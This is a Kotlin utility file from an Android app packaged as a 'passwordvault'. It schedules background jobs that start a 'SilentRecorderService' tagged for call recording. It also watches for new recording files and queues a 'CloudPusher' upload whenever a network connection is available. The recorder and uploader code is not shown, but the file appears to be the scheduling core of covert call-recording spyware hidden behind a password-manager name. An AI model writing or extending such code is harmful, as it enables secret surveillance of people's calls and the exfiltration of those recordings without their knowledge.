package com.example.passwordvault.util

import android.content.Context
import android.net.Uri
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.work.*
import com.example.passwordvault.service.SilentRecorderService
import java.io.File

object WorkerProvider {
    private const val recorderJobTag = "com.japps.recording.call"
    private const val newRecordingCheckTag = "com.japps.recordings.newOne"

    private val baseConstraints = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Constraints.Builder()
            .setRequiresCharging(false)
            .setRequiresDeviceIdle(false)
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(false)

    } else {
        Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .setRequiresCharging(false)
            .setRequiresBatteryNotLow(true)
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun periodicUriCheckWorkRequest(context: Context): OneTimeWorkRequest {
        val file = File(context.externalCacheDir?.absolutePath!!)
        val uri = Uri.fromFile(file)
        val uriCheckConstraints = baseConstraints
            .addContentUriTrigger(uri, false)

        return OneTimeWorkRequestBuilder<UriChecker>()
            .setConstraints(uriCheckConstraints.build())
            .addTag(newRecordingCheckTag)
            .build()
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun startUriChecker(context: Context, latestRecord: String?) {
        Log.e("UriChecker", "started")
//        val work = periodicUriCheckWorkRequest(context)
        val data = Data.Builder().putString(LATEST_RECORD, latestRecord).build()
        val work = OneTimeWorkRequestBuilder<UriChecker>()
            .setInputData(data)
            .setConstraints(baseConstraints.build())
            .addTag(newRecordingCheckTag)
            .build()
        enqueueUniqueWork("uniqueWorkUriChecker", context, work)
    }

    fun newRecordingCheckUploadWork(): OneTimeWorkRequest {
        return OneTimeWorkRequestBuilder<CloudPusher>()
            .setConstraints(baseConstraints.build())
            .build()
    }

    fun startRecorderWork(context: Context) {
        val work =  OneTimeWorkRequestBuilder<SilentRecorderService>()
            .addTag(recorderJobTag)
            .build()
        getWorkManager(context).enqueue(work)
    }

    fun stopRecordingWork(context: Context) {
        Log.e("inWorkStop", "-> $context")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N){
            val latestRecord = PreferenceUtil.latestRecord(context)
            startUriChecker(context.applicationContext, latestRecord)
        }
        getWorkManager(context).cancelAllWorkByTag(recorderJobTag)
    }

    fun enqueueWork(context: Context, work: WorkRequest) {
        Log.e("inWork", "-> $context")
        getWorkManager(context).enqueue(work)
    }

    private fun enqueueUniqueWork(tag: String, context: Context, work: OneTimeWorkRequest) {
        Log.e("inUniqueWork", "-> $context")
        getWorkManager(context).enqueueUniqueWork(tag, ExistingWorkPolicy.REPLACE, work)
    }

    fun uriSatires() {
//        return PeriodicWorkRequestBuilder<CloudPusher>()
    }

    private fun getWorkManager(context: Context) = WorkManager.getInstance(context)
}